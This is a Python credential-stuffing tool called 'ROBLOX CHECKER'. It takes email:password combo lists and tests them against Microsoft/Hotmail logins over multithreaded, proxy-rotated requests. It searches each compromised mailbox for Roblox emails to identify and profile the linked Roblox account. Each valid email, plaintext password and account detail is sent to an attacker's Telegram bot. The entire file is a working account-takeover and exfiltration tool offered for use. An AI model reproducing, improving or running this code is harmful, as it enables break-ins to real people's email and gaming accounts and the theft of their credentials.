import requests
import uuid
import json
import re
import threading
import sys
import time
from queue import Queue
from colorama import Fore, init, Style
from user_agent import generate_user_agent
import os

init(autoreset=True)

BOT_TOKEN = ""
CHAT_ID = ""
mwRetries = 50
stats = {"hits": 0, "bad": 0, "custom": 0, "white": 0, "total": 0, "processed": 0}
lock = threading.Lock()

def send_telegram(email, password, username, friends, banned, created, profile, wearing):
    try:
        wearing_str = ", ".join(wearing[:5]) if wearing else "None"
        msg = f"""✅ ROBLOX HIT!
📧 {email}
🔑 {password}
👤 {username}
👥 Friends: {friends}
🚫 Banned: {banned}
📅 Created: {created}
🔗 {profile}
👕 Wearing: {wearing_str}
@Aegriss"""
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                      json={"chat_id": CHAT_ID, "text": msg}, timeout=5)
    except: pass

def print_stats():
    sys.stdout.write(f"\r[{stats['processed']}/{stats['total']}] Hits: {stats['hits']} Bad: {stats['bad']} Custom: {stats['custom']} Retries: {stats['white']}")
    sys.stdout.flush()

def print_live_stats():
    os.system('clear' if os.name == 'posix' else 'cls')
    print("[ROBLOX CHECKER] - Live Stats")
    print("[INFO] Created by @Aegriss")
    print("-----------------------------------------")
    print(f"[+] Total: {stats['total']}")
    print(f"[+] Processed: {stats['processed']}")
    print(f"[+] Hits: {stats['hits']}")
    print(f"[+] Bad: {stats['bad']}")
    print(f"[+] Custom: {stats['custom']}")
    print(f"[+] Retries: {stats['white']}")
    print("-----------------------------------------")
    print("[+] Scanning... Press CTRL+C to stop")

def get_user_id(username):
    try:
        r = requests.post("https://users.roblox.com/v1/usernames/users",
                         json={"usernames": [username], "excludeBannedUsers": False}, timeout=10)
        if r.status_code == 200 and r.json().get("data"):
            return r.json()["data"][0]["id"]
    except: pass
    return None

def get_csrf():
    s = requests.Session()
    try:
        r = s.post("https://catalog.roblox.com/v1/catalog/items/details", json={"items": []}, timeout=10)
        token = r.headers.get("x-csrf-token")
        return token, s
    except: return None, None

def get_asset_names(asset_ids):
    if not asset_ids: return []
    token, session = get_csrf()
    if not token: return []
    try:
        items = [{"itemType": "Asset", "id": int(aid)} for aid in asset_ids]
        r = session.post("https://catalog.roblox.com/v1/catalog/items/details",
                        json={"items": items}, headers={"x-csrf-token": token}, timeout=10)
        if r.status_code == 200:
            return [item.get("name", "Unknown") for item in r.json().get("data", [])]
    except: pass
    return []

def get_roblox_data(username, proxies=None):
    user_id = get_user_id(username)
    if not user_id: return None
    
    try:
        user = requests.get(f"https://users.roblox.com/v1/users/{user_id}", timeout=10, proxies=proxies).json()
        friends = requests.get(f"https://friends.roblox.com/v1/users/{user_id}/friends/count", timeout=10, proxies=proxies).json()
        wearing = requests.get(f"https://avatar.roblox.com/v1/users/{user_id}/currently-wearing", timeout=10, proxies=proxies).json()
        
        asset_names = get_asset_names(wearing.get("assetIds", []))
        
        return {
            "username": username,
            "friends": friends.get("count", 0),
            "banned": "Yes" if user.get("isBanned", False) else "No",
            "created": user.get("created", "").split("T")[0] if user.get("created") else "Unknown",
            "profile": f"https://www.roblox.com/users/{user_id}/profile",
            "wearing": asset_names
        }
    except: return None

def extract_roblox_user(text):
    patterns = [r'account:\s*([a-zA-Z0-9_]+)', r'for\s+([a-zA-Z0-9_]+)\s+and', r'for\s+([a-zA-Z0-9_]+)\.']
    for p in patterns:
        match = re.search(p, text, re.IGNORECASE)
        if match: return match.group(1)
    return None

def check_hotmail(email, password, proxies=None):
    session = requests.Session()
    if proxies: session.proxies = proxies
    
    try:
        url = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r = session.get(url, headers={"User-Agent": generate_user_agent()}, allow_redirects=True)
        
        ppft = re.search(r'name="PPFT"\s+value="([^"]+)"', r.text)
        if not ppft: return None
        ppft = ppft.group(1)
        
        urlPost = re.search(r'"urlPost":"([^"]+)"', r.text)
        if not urlPost: return None
        urlPost = urlPost.group(1)
        
        data = f"login={email}&loginfmt={email}&passwd={password}&PPFT={ppft}&PPSX=Passport&NewUser=1"
        post = session.post(urlPost, data=data, headers={"Content-Type": "application/x-www-form-urlencoded"}, allow_redirects=False)
        
        if "__Host-MSAAUTHP" not in session.cookies.get_dict():
            return None
        
        auth_code = None
        if 'Location' in post.headers and 'code=' in post.headers['Location']:
            auth_code = post.headers['Location'].split('code=')[1].split('&')[0]
        
        if not auth_code: return None
        
        token_res = requests.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                 data={"client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
                                       "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
                                       "grant_type": "authorization_code", "code": auth_code,
                                       "scope": "profile openid offline_access https://outlook.office.com/M365.Access"},
                                 timeout=30, proxies=proxies if proxies else None)
        if token_res.status_code != 200: return None
        access_token = token_res.json().get("access_token")
        if not access_token: return None
        
        cid = session.cookies.get("MSPCID", "").upper()
        if not cid: return None
        
        search = requests.post("https://outlook.live.com/search/api/v2/query",
                              json={"EntityRequests": [{"EntityType": "Conversation", "Query": {"QueryString": "no-reply@roblox.com"}, "Size": 25}]},
                              headers={"Authorization": f"Bearer {access_token}", "X-AnchorMailbox": f"CID:{cid}"},
                              timeout=30, proxies=proxies if proxies else None)
        
        if search.status_code != 200: return None
        
        roblox_user = extract_roblox_user(search.text)
        if not roblox_user: return None
        
        roblox_data = get_roblox_data(roblox_user, proxies)
        if not roblox_data: return None
        
        return {"email": email, "password": password, "roblox": roblox_data}
        
    except: return None

def worker(combo_queue, proxy_queue):
    while not combo_queue.empty():
        combo = combo_queue.get()
        
        with lock:
            stats["processed"] += 1
        
        try:
            email, password = combo.split(":", 1)
        except:
            combo_queue.task_done()
            continue
        
        proxy = None
        if not proxy_queue.empty():
            proxy = proxy_queue.get()
            proxy_queue.put(proxy)
        
        proxies = None
        if proxy:
            if '@' in proxy:
                userpass, ipport = proxy.split('@')
                user, pw = userpass.split(':')
                ip, port = ipport.split(':')
                proxies = {"http": f"http://{user}:{pw}@{ip}:{port}", "https": f"http://{user}:{pw}@{ip}:{port}"}
            else:
                ip, port = proxy.split(':')
                proxies = {"http": f"http://{ip}:{port}", "https": f"http://{ip}:{port}"}
        
        result = check_hotmail(email, password, proxies)
        
        if result:
            with lock:
                stats["hits"] += 1
            data = result["roblox"]
            send_telegram(email, password, data["username"], data["friends"], data["banned"], data["created"], data["profile"], data["wearing"])
        else:
            with lock:
                stats["bad"] += 1
        
        print_stats()
        combo_queue.task_done()

def main():
    global BOT_TOKEN, CHAT_ID, stats
    
    print("[ROBLOX CHECKER] - Started Successfully")
    print("[INFO] Created by @Aegriss")
    print("-----------------------------------------")
    
    BOT_TOKEN = input("[+] Setup Bot Token: ").strip()
    CHAT_ID = input("[+] Setup Chat ID: ").strip()
    
    proxy_choice = input("[+] Proxy or Proxyless (p/n): ").strip().lower()
    use_proxy = proxy_choice in ['p', 'proxy']
    
    combo_file = input("[+] Combo file: ").strip()
    proxy_file = input("[+] Proxy file (optional): ").strip() if use_proxy else None
    
    print("-----------------------------------------")
    
    combo_queue = Queue()
    proxy_queue = Queue()
    
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        for line in f:
            line = line.strip()
            if line and ':' in line:
                combo_queue.put(line)
                stats["total"] += 1
    
    if use_proxy and proxy_file:
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            for line in f:
                line = line.strip()
                if line:
                    proxy_queue.put(line)
    
    threads = min(50, stats["total"])
    
    def live_stats_thread():
        while combo_queue.qsize() > 0 or any(t.is_alive() for t in threading.enumerate() if t.name != "MainThread"):
            print_live_stats()
            time.sleep(1)
        print_live_stats()
    
    stats_thread = threading.Thread(target=live_stats_thread, daemon=True)
    stats_thread.start()
    
    for _ in range(threads):
        t = threading.Thread(target=worker, args=(combo_queue, proxy_queue))
        t.daemon = True
        t.start()
    
    try:
        while combo_queue.qsize() > 0:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Stopped by user")
    
    print("-----------------------------------------")
    print("[ROBLOX CHECKER] - Final Results")
    print(f"[+] Hits: {stats['hits']}")
    print(f"[+] Bad: {stats['bad']}")
    print(f"[+] Custom: {stats['custom']}")
    print(f"[+] Retries: {stats['white']}")
    print(f"[+] Total: {stats['total']}")
    print(f"[+] Processed: {stats['processed']}")
    print("-----------------------------------------")

if __name__ == "__main__":
    main()
